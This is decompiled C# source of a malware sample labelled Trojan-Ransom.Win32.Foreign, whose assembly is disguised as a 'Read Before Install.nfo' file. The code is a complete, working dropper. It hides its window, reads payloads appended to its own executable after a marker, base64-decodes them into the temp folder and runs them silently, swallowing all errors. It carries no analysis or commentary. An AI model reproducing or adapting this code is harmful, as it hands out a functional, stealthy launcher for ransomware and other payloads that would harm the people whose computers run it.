// Decompiled with JetBrains decompiler
// Type: Form1
// Assembly: Read Before Install.nfo, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EE805F91-1643-43E5-B892-CFF8602E8D1A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Trojan-Ransom.Win32.Foreign.mxhf-c961e62a4b677669fee59147db2ac3b55026b46e4f546d7c3b6a8b3dd7e503e5.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;

[DesignerGenerated]
public class Form1 : Form
{
  private IContainer components;
  private List<int> orders;
  private List<string> filenames;
  private List<bool> executes;

  public Form1()
  {
    this.Shown += new EventHandler(this.gloa);
    this.orders = new List<int>();
    this.filenames = new List<string>();
    this.executes = new List<bool>();
    this.InitializeComponent();
  }

  [STAThread]
  public static void Main() => Application.Run((Form) new Form1());

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.components == null)
        return;
      this.components.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void InitializeComponent()
  {
    this.SuspendLayout();
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.ClientSize = new Size(0, 0);
    this.ControlBox = false;
    this.FormBorderStyle = FormBorderStyle.None;
    this.Name = nameof (Form1);
    this.Opacity = 0.0;
    this.ShowIcon = false;
    this.ShowInTaskbar = false;
    this.WindowState = FormWindowState.Minimized;
    this.ResumeLayout(false);
  }

  private void gloa(object sender, EventArgs e)
  {
    try
    {
      string[] strArray1 = Module1.files().Split('¥');
      try
      {
        string[] strArray2 = strArray1;
        int index = 0;
        while (index < strArray2.Length)
        {
          string str = strArray2[index];
          try
          {
            string[] strArray3 = str.Split('¦');
            this.orders.Add(int.Parse(strArray3[0]));
            this.filenames.Add(strArray3[1]);
            this.executes.Add(bool.Parse(strArray3[2]));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
      string Expression = this.sssa();
      FileSystem.FileGet(1, ref Expression);
      FileSystem.FileClose(1);
      string[] strArray4 = Strings.Split(Expression, "######")[1].Split('$');
      int index1 = 0;
      string[] strArray5 = strArray4;
      int index2 = 0;
      while (index2 < strArray5.Length)
      {
        string s = strArray5[index2];
        try
        {
          byte[] data = Convert.FromBase64String(s);
          MyProject.Computer.FileSystem.WriteAllBytes(Environment.GetEnvironmentVariable("temp") + "\\" + this.filenames[index1], data, false);
          checked { ++index1; }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        this.Delay(1);
        checked { ++index2; }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      try
      {
        foreach (int order in this.orders)
        {
          if (this.executes[order])
          {
            try
            {
              Process.Start(Path.GetTempPath() + this.filenames[order]);
              this.Delay(1);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
        }
      }
      finally
      {
        List<int>.Enumerator enumerator;
        enumerator.Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    this.Close();
  }

  private void Delay(int DelayInSeconds)
  {
    DateTime dateTime = DateTime.Now.AddSeconds((double) DelayInSeconds);
    TimeSpan timeSpan;
    do
    {
      timeSpan = dateTime.Subtract(DateTime.Now);
      Application.DoEvents();
      Thread.Sleep(100);
    }
    while (timeSpan.TotalSeconds > 0.0);
  }

  private string sssa() => Strings.Space(checked ((int) FileSystem.LOF(1)));
}
